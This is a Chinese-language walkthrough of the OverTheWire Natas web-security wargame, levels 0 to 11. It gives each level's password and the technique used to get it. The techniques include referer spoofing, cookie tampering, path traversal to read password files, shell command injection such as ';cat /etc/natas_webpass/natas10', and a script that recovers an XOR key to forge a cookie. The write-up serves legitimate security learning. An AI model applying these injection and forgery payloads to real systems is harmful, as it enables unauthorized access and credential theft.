# natas

每一关的地址是http://natasX.natas.labs.overthewire.org，其中X代表当前关数，默认用户名是nataX（eg.natas0 是level0的用户名），通过当前的一关获取进入下一关的密码。所有密码存储在/etc/natas_webpass/中（eg.level5的密码存储在/etc/natas_webpass/natas5，只能在第四关和第五关能够读取密码）

原文链接：https://blog.csdn.net/tempulcc/article/details/108758417

## level0

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

* 谷歌浏览器打开开发者选项
* 获得密码：0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
* <!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->



## Natas Level 0 → Level 1

```
Username: natas1
URL:      http://natas1.natas.labs.overthewire.org
```

* <!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
* TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

## Natas Level 1 → Level 2

```
Username: natas2
URL:      http://natas2.natas.labs.overthewire.org
```

*  发现 http://natas2.natas.labs.overthewire.org/files/pixel.png

* 访问files目录

* 发现 users.txt

* 获得：

* ```
  # username:password
  alice:BYNdCesZqW
  bob:jw2ueICLvT
  charlie:G5vCxkVV3m
  natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
  eve:zo4mJWyNj2
  mallory:9urtcpzBmH
  ```

## Natas Level 2 → Level 3

```
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org
```

* 开发模式查看提示：<!-- No more information leaks!! Not even Google will find it this time... -->

* 谷歌通过爬robots.txt决定是否爬取文件

* 访问   http://natas3.natas.labs.overthewire.org/robots.txt

* 获得：

* ```
  User-agent: *
  Disallow: /s3cr3t/
  ```

* 访问  http://natas3.natas.labs.overthewire.org/s3cr3t/

* 找到user.txt
* 获得密码：natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

## Natas Level 3 → Level 4

```
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
```

* curl -isu natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ natas4.natas.labs.overthewire.org --referer "http://natas5.natas.labs.overthewire.org/"
* The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
* 或者
* 用brup suite抓包后
* proxy 抓包修改referer为 http://natas5.natas.labs.overthewire.org/
  * 保证intercept 为 intercept  is on
  * 修改referer后点击forward
  * 返回原来页面即可查看natas5答案

## Natas Level 4 → Level 5

```
Username: natas5
URL:      http://natas5.natas.labs.overthewire.org
```

* 登录后用bp拦截
* 修改loggedin=0为1
* Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

## Natas Level 5 → Level 6

```
Username: natas6
URL:      http://natas6.natas.labs.overthewire.org
```

* 输入账号密码后出现提示

* ``````
  include "includes/secret.inc";
  
    if(array_key_exists("submit", $_POST)) {
      if($secret == $_POST['secret']) {
      print "Access granted. The password for natas7 is <censored>";
    } else {
      print "Wrong secret";
    }
    }
  ?>
  ``````

* 尝试访问http://natas6.natas.labs.overthewire.org/includes/secret.inc

  * 

  * ```
    <?
    $secret = "FOEIUWGHFEEUHOFUOIU";
    ?>
    ```

* 输入FOEIUWGHFEEUHOFUOIU

* Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## Natas Level 6 → Level 7

```
Username: natas7
URL:      http://natas7.natas.labs.overthewire.org
```

* 输入账号密码后查看源代码
  * <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
* http://natas7.natas.labs.overthewire.org/etc/natas_webpass/natas8
* 点击about超链接后http://natas7.natas.labs.overthewire.org/index.php?page=about
* 尝试http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
* 获得密码xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

## Natas Level 7 → Level 8

```
Username: natas8
URL:      http://natas8.natas.labs.overthewire.org
```

* 输入密码后获得提示

  * ``````
    <?
    
    $encodedSecret = "3d3d516343746d4d6d6c315669563362";
    
    function encodeSecret($secret) {
        return bin2hex(strrev(base64_encode($secret)));
    }
    
    if(array_key_exists("submit", $_POST)) {
        if(encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted. The password for natas9 is <censored>";
        } else {
        print "Wrong secret";
        }
    }
    ?>
    ``````

  * ``````py
    import base64
    
    hex_str = "3d3d516343746d4d6d6c315669563362"
    
    # 将16进制字符串转换为bytes对象（二进制数据）
    binary_data = bytes.fromhex(hex_str)
    print(binary_data)
    temp = binary_data[::-1]
    print(temp)
    res = base64.b64decode(temp)
    print(res)
    ``````
  
    * 获得结果
      * b'==QcCtmMml1ViV3b'
        b'b3ViV1lmMmtCcQ=='
        b'oubWYf2kBq'
  
  * 输入oubWYf2kBq
  
  * 获得密码Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
  

## Natas Level 8 → Level 9

```
Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
```

* 提示

  * ``````php
    Output:
    <pre>
    <?
    $key = "";
    
    if(array_key_exists("needle", $_REQUEST)) {
        $key = $_REQUEST["needle"];
    }
    
    if($key != "") {
        passthru("grep -i $key dictionary.txt");
    }
    ?>
    </pre>
    
    ``````

* 命令注入 ;cat /etc/natas_webpass/natas10 

  * `;`用来做截断

* 获得密码 t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

## Natas Level 9 → Level 10

```
Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
```

* 提示

* ``````
  if(array_key_exists("needle", $_REQUEST)) {
      $key = $_REQUEST["needle"];
  }
  
  if($key != "") {
      if(preg_match('/[;|&]/',$key)) {
          print "Input contains an illegal character!";
      } else {
          passthru("grep -i $key dictionary.txt");
      }
  }
  ``````

* 过滤；| & 字符，无法用；分割

* . /etc/natas_webpass/natas11 #

  * . 表示匹配任意字符，# 表示截断命令

* 获得密码：UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

## Natas Level 10 → Level 11

```
Username: natas11
URL:      http://natas11.natas.labs.overthewire.org
```

* 提示

* ``````php
  $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
  
  function xor_encrypt($in) {
      $key = '<censored>';
      $text = $in;
      $outText = '';
  
      // Iterate through each character
      for($i=0;$i<strlen($text);$i++) {
      $outText .= $text[$i] ^ $key[$i % strlen($key)];
      }
  
      return $outText;
  }
  
  function loadData($def) {
      global $_COOKIE;
      $mydata = $def;
      if(array_key_exists("data", $_COOKIE)) {
      $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
      if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
          if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
          $mydata['showpassword'] = $tempdata['showpassword'];
          $mydata['bgcolor'] = $tempdata['bgcolor'];
          }
      }
      }
      return $mydata;
  }
  
  function saveData($d) {
      setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
  }
  
  $data = loadData($defaultdata);
  
  if(array_key_exists("bgcolor",$_REQUEST)) {
      if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
          $data['bgcolor'] = $_REQUEST['bgcolor'];
      }
  }
  
  saveData($data);
  
  ``````

* 获得cookie中data值HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg

* ``````
  <?php 
   
  $cookie = ''; # cookie 中 data 字段
  $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");  
  function xor_decrypt($in) {     
      $key = '';     
      $text = $in;     
      $outText = json_encode($defaultdata);     
      // Iterate through each character    
      for($i=0;$i<strlen($text);$i++){
      $key .= $text[$i] ^ $outText[$i % strlen($outText)];
      }
   
      return $key;
  }
   
   
  echo xor_decrypt(base64_decode($cookie));
   
  ?>
  
  
  
  
  
  <?php  
    
  $data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");  
    
  function xor_encrypt($in) {  
      $key = '';  # key
      $text = $in;  
      $outText = '';  
    
      // Iterate through each character  
      for($i=0;$i<strlen($text);$i++) {  
      $outText .= $text[$i] ^ $key[$i % strlen($key)];  
      }  
    
      return $outText;  
  }  
    
  echo base64_encode(xor_encrypt(json_encode($data)));  
    
  ?>  
  ``````

* python解法

* ``````python
  #!/usr/bin/env python3
  # -*- coding: utf-8 -*-
  """
  Name: natas11.py
  Auth: Kael Hong
  Date: 2022-01-25
  Version: V1.0
  Description:
      The decryption function of XOR encryption
  """
  
  # -------------Import Modules----------------------#
  import base64
  
  # -------------Definitions of Variables-------------#
  # %3D在html中编码为=，不加=也可以
  data = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="
  origin_data = '{"showpassword":"no","bgcolor":"#ffffff"}'
  
  
  # -------------Definitions of Functions-----------#
  def xor_cal(a, b):
      return map(lambda x: chr(x[0] ^ x[1]), zip(a, [ord(x) for x in b]))
  
  
  # -------------Main-------------#
  if __name__ == '__main__':
      print('running...')
      data_base64 = base64.b64decode(data)
      key = xor_cal(data_base64, origin_data)
      key = [i for i in key]
      print(''.join(key))
      
      
     # 获得结果 eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
     
     
     #!/usr/bin/env python3
  # -*- coding: utf-8 -*-
  """
  Name: natas11_encrypt.py
  Auth: Kael Hong
  Date: 2022-01-25
  Version: V1.0
  Description:
      The encryption function of XOR
  """
   
  #-------------Import Modules----------------------#
  import base64
   
  #-------------Definitions of Variable-------------#
  data = '{"showpassword":"yes","bgcolor":"#ffffff"}'
  key = 'eDWo' # 因为data变为yes，所以取最短的密钥，取用原来长度的也可以
  key_derive=key*(int(len(data)/len(key)))+key[0:len(data)%len(key)+1]
   
  #-------------Definitions of Functions-----------#
  def xor_cal(m,n):
      return map(lambda x: chr(ord(x[0])^ord(x[1])),zip(m,n))
   
  #-------------Main-------------#
  if __name__ == '__main__':
      cipher = bytes(''.join(xor_cal(data,key_derive)),encoding='utf-8')
      text = base64.b64encode(cipher)
      print(text)
      
      # 获得结果b'HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5'
  # HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5为有效值
  ``````

* 获得密码：The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB